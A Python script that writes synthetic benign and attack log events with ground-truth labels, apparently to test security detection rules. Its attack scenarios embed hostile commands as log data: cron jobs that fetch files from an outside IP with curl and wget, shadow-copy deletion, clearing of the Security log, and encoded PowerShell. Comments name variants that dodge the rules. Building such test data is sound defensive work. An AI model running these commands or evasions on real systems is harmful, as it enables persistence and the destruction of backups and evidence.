"""Generate synthetic benign + attack logs and a ground-truth file. Logs only; nothing here executes anything.

Usage: python simulate.py [--seed 7] [--out data]
Writes: <out>/logs.jsonl (events) and <out>/truth.jsonl (one row per malicious event).
"""
import argparse
import random
import string
from datetime import datetime, timedelta, timezone
from pathlib import Path

from engine.engine import write_jsonl

START = datetime(2026, 1, 12, 8, 0, tzinfo=timezone.utc)
SPAN = 8 * 3600
USERS = [f"u{i:02d}" for i in range(1, 41)]
WIN_HOSTS = [f"wks-{i:03d}" for i in range(1, 21)]
LINUX_HOSTS = [f"srv-{i:02d}" for i in range(1, 6)]
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
EXPLORER = r"C:\Windows\explorer.exe"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
B64 = "ZGVtby1vbmx5"  # placeholder text, not a payload
BENIGN_PROCS = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --profile-directory=Default"),
    (r"C:\Windows\System32\notepad.exe", "notepad.exe notes.txt"),
    (EXCEL, "EXCEL.EXE budget.xlsx"),
    (PS, "powershell.exe -NoProfile -Command Get-Date"),
    (PS, "powershell.exe -ExecutionPolicy Bypass -File backup.ps1 -Encoding utf8"),
    (CMD, "cmd.exe /c dir"),
]
DOMAINS = ["example.com", "cdn.example.net", "mail.example.org", "updates.example.com", "api.example.io"]


def rand_label(rng, k, alphabet=string.ascii_lowercase + string.digits):
    return "".join(rng.choices(alphabet, k=k))


class Sim:
    def __init__(self, seed):
        self.rng = random.Random(seed)
        self.events, self.truth = [], []
        self.seq = self.inst = 0

    # -- plumbing ---------------------------------------------------------
    def at(self, offset):
        return START + timedelta(seconds=offset)

    def start(self):
        return self.at(self.rng.randint(1800, SPAN - 3600))

    def label(self, scenario, rule):
        self.inst += 1
        return {"scenario": scenario, "instance": f"inst-{self.inst:03d}", "expected_rule": rule}

    def emit(self, t, product, category, event_type, label=None, **fields):
        self.seq += 1
        ev = {"id": f"e{self.seq:06d}", "ts": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "product": product,
              "category": category, "event_type": event_type, **fields}
        self.events.append(ev)
        if label:
            self.truth.append({"event_id": ev["id"], **label})
        return ev

    def login(self, t, user, ip, ok, country="US", label=None):
        return self.emit(t, "windows", "authentication", "login_success" if ok else "login_failure", label,
                         user=user, src_ip=ip, geo_country=country, host="vpn-gw")

    def proc(self, t, host, user, image, cmd, parent=EXPLORER, label=None):
        return self.emit(t, "windows", "process_creation", "process_start", label,
                         host=host, user=user, image=image, command_line=cmd, parent_image=parent)

    def dns(self, t, host, query, label=None):
        return self.emit(t, "network", "dns", "dns_query", label, host=host, query=query, query_length=len(query))

    def rename(self, t, host, user, old, new, label=None):
        return self.emit(t, "windows", "file_event", "file_rename", label, host=host, user=user, old_name=old,
                         new_name=new, ext_changed=old.rsplit(".", 1)[-1] != new.rsplit(".", 1)[-1])

    def linux(self, t, event_type, label=None, **fields):
        return self.emit(t, "linux", "file_event", event_type, label, **fields)

    # -- benign background ------------------------------------------------
    def benign(self):
        r = self.rng
        for i, user in enumerate(USERS):
            ip = f"10.1.{i}.{10 + i}"
            for _ in range(r.randint(3, 6)):
                t = self.at(r.randint(0, SPAN))
                if r.random() < 0.05:  # fat-fingered password
                    self.login(t - timedelta(seconds=30), user, ip, False)
                self.login(t, user, ip, True)
        for i, host in enumerate(WIN_HOSTS):
            user = USERS[i]
            for _ in range(25):
                image, cmd = r.choice(BENIGN_PROCS)
                self.proc(self.at(r.randint(0, SPAN)), host, user, image, cmd)
            for _ in range(30):
                query = f"{r.choice(['www', 'img', 'static', 'login', 'a'])}.{r.choice(DOMAINS)}"
                self.dns(self.at(r.randint(0, SPAN)), host, query)
            if r.random() < 0.5:  # one odd-but-harmless long lookup
                self.dns(self.at(r.randint(0, SPAN)), host, rand_label(r, 62) + ".cdn.example.net")
            for k in range(5):
                self.rename(self.at(r.randint(0, SPAN)), host, user, f"report_v{k}.docx", f"report_v{k + 1}.docx")
        for host in LINUX_HOSTS:
            t = self.at(r.randint(0, SPAN))
            self.linux(t, "cron_modified", host=host, user="root", process="ansible", path="/etc/cron.d/backup",
                       command="/usr/local/bin/backup.sh --nightly")
            self.linux(t + timedelta(seconds=5), "file_modified", host=host, user="root", process="ansible",
                       path="/home/deploy/.ssh/authorized_keys")

    # -- benign-but-noisy events that should trigger false positives -------
    def noise(self):
        r = self.rng
        t = self.at(r.randint(3600, 20000))  # SS-001: stale service-account password in a retry loop
        for k in range(12):
            self.login(t + timedelta(seconds=20 * k), "svc-backup", "10.0.9.9", False)
        t = self.at(r.randint(3600, 20000))  # SS-002: corporate VPN exit in another country
        self.login(t, "u07", "10.1.6.16", True, "US")
        self.login(t + timedelta(minutes=20), "u07", "192.0.2.77", True, "NL")
        t = self.at(r.randint(3600, 20000))  # SS-003: SCCM ships a script as an encoded command
        self.proc(t, "wks-004", "svc-sccm", PS, f"powershell.exe -NoProfile -EncodedCommand {B64}ZGVtbw==",
                  parent=r"C:\Windows\CCM\CcmExec.exe")
        t = self.at(r.randint(3600, 20000))  # SS-004: help desk onboards an admin contractor
        self.emit(t, "windows", "account_management", "account_created", actor="helpdesk",
                  target_user="contractor-it", host="dc-01")
        self.emit(t + timedelta(minutes=1), "windows", "account_management", "group_add", actor="helpdesk",
                  target_user="contractor-it", group="Administrators", host="dc-01")
        t = self.at(r.randint(3600, 20000))  # SS-006: bulk photo converter
        for k in range(40):
            self.rename(t + timedelta(seconds=k), "wks-011", "u11", f"IMG_{k:04d}.heic", f"IMG_{k:04d}.jpg")
        t = self.at(r.randint(3600, 20000))  # SS-007: health-check ping scheduled with curl
        self.linux(t, "cron_modified", host="srv-02", user="root", process="crontab",
                   path="/var/spool/cron/crontabs/root",
                   command="*/10 * * * * curl -fsS https://hc.internal.example/ping >/dev/null")
        t = self.at(r.randint(3600, 20000))  # SS-008: antivirus hash lookups as subdomains
        for k in range(6):
            self.dns(t + timedelta(seconds=20 * k), "wks-015", rand_label(r, 48, "0123456789abcdef") + ".lookup.av-cloud.example")
        t = self.at(r.randint(0, 600))  # SS-009: Monday-morning office NAT
        for k, user in enumerate(USERS[10:19]):
            self.login(t + timedelta(seconds=25 * k), user, "203.0.113.10", False)
        t = self.at(r.randint(3600, 20000))  # SS-012: finance macro copies a file via cmd
        self.proc(t, "wks-007", "u07", CMD, r"cmd.exe /c copy report.csv \\fileserver\finance", parent=EXCEL)

    # -- labelled attack scenarios (log lines only) ------------------------
    def attacks(self):
        r, sec = self.rng, (lambda t, s: t + timedelta(seconds=s))
        victims = USERS[20:]

        for n, slow in enumerate([False, False, False, True]):  # SS-001; the slow one dodges the threshold
            lab = self.label("brute_force_slow" if slow else "brute_force", "SS-001")
            t, ip, gap, tries = self.start(), f"198.51.100.{10 + n}", (420 if slow else 12), (6 if slow else 18)
            for k in range(tries):
                self.login(sec(t, gap * k), victims[n], ip, False, "RU", lab)
            self.login(sec(t, gap * tries), victims[n], ip, True, "RU", lab)

        for n, country in enumerate(["RO", "NG", "BR"]):  # SS-002
            t = self.start()
            self.login(t, victims[4 + n], f"10.1.{24 + n}.40", True, "US")
            self.login(sec(t, 900), victims[4 + n], f"203.0.113.{50 + n}", True, country, self.label("impossible_travel", "SS-002"))

        for n, short in enumerate([False, False, False, True]):  # SS-003; "-ec" evades the pattern
            lab = self.label("encoded_powershell_short_flag" if short else "encoded_powershell", "SS-003")
            flag = "-ec" if short else "-EncodedCommand"
            self.proc(self.start(), WIN_HOSTS[n], victims[n], PS, f"powershell.exe -NoProfile {flag} {B64}ZGVtbw==",
                      parent=CMD, label=lab)

        for n in range(3):  # SS-004
            t, lab = self.start(), self.label("new_admin_user", "SS-004")
            args = dict(actor=victims[n], target_user=f"svc-upd{n}", host="dc-01")
            self.emit(t, "windows", "account_management", "account_created", lab, **args)
            self.emit(sec(t, 45), "windows", "account_management", "group_add", lab, group="Administrators", **args)

        for n in range(3):  # SS-005
            t, lab = self.start(), self.label("log_clearing", "SS-005")
            if n < 2:
                self.emit(t, "windows", "system", "log_cleared", lab, host=WIN_HOSTS[n], user=victims[n], log_name="Security")
            else:
                self.proc(t, WIN_HOSTS[n], victims[n], r"C:\Windows\System32\wevtutil.exe", "wevtutil.exe cl Security", label=lab)

        for n in range(3):  # SS-006
            t, lab = self.start(), self.label("mass_file_rename", "SS-006")
            for k in range(60):
                self.rename(sec(t, k * 3 // 4), WIN_HOSTS[n + 5], victims[n], f"doc_{k:03d}.xlsx", f"doc_{k:03d}.xlsx.locked", lab)

        cron = [("cron_persistence", "*/5 * * * * curl -s http://203.0.113.7/update.txt -o /tmp/.u"),
                ("cron_persistence", "@reboot wget -q http://203.0.113.7/x -O /dev/shm/.x"),
                ("cron_hidden_script", "*/15 * * * * /opt/.cache/run.sh")]  # nothing the rule keys on
        for n, (scenario, command) in enumerate(cron):  # SS-007
            self.linux(self.start(), "cron_modified", self.label(scenario, "SS-007"), host=LINUX_HOSTS[n],
                       user="root", process="crontab", path="/var/spool/cron/crontabs/root", command=command)

        for n in range(3):  # SS-008
            t, lab = self.start(), self.label("dns_long_queries", "SS-008")
            for k in range(12):
                self.dns(sec(t, 15 * k), WIN_HOSTS[n + 8], rand_label(r, 60) + ".t.example-c2.invalid", lab)

        for n in range(3):  # SS-009
            t, lab = self.start(), self.label("password_spraying", "SS-009")
            for k, user in enumerate(r.sample(USERS, 12)):
                self.login(sec(t, 30 * k), user, f"198.51.100.{100 + n}", False, "RU", lab)

        shadow = [("shadow_copy_deletion", "vssadmin.exe delete shadows /all /quiet"),
                  ("shadow_copy_deletion", "wmic shadowcopy delete"),
                  ("shadow_copy_deletion", "vssadmin.exe delete shadows /all /quiet"),
                  ("shadow_copy_deletion_cim", "powershell.exe -NoProfile -Command Get-CimInstance Win32_ShadowCopy | Remove-CimInstance")]
        for n, (scenario, cmd) in enumerate(shadow):  # SS-010; the CIM variant evades the pattern
            self.proc(self.start(), WIN_HOSTS[n + 2], victims[n], rf"C:\Windows\System32\{cmd.split()[0]}", cmd, parent=CMD,
                      label=self.label(scenario, "SS-010"))

        for n in range(3):  # SS-011
            self.linux(self.start(), "file_modified", self.label("authorized_keys_tamper", "SS-011"),
                       host=LINUX_HOSTS[n], user="deploy", process="bash", path="/home/deploy/.ssh/authorized_keys")

        for n in range(3):  # SS-012
            self.proc(self.start(), WIN_HOSTS[n + 12], victims[n + 10], CMD, "cmd.exe /c whoami", parent=WORD,
                      label=self.label("office_spawns_shell", "SS-012"))


def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--seed", type=int, default=7)
    p.add_argument("--out", default=str(Path(__file__).parent / "data"))
    args = p.parse_args(argv)
    sim = Sim(args.seed)
    sim.benign()
    sim.noise()
    sim.attacks()
    out = Path(args.out)
    write_jsonl(out / "logs.jsonl", sorted(sim.events, key=lambda e: (e["ts"], e["id"])))
    write_jsonl(out / "truth.jsonl", sim.truth)
    print(f"{len(sim.events)} events, {len(sim.truth)} malicious, {sim.inst} attack instances -> {out}")


if __name__ == "__main__":
    main()
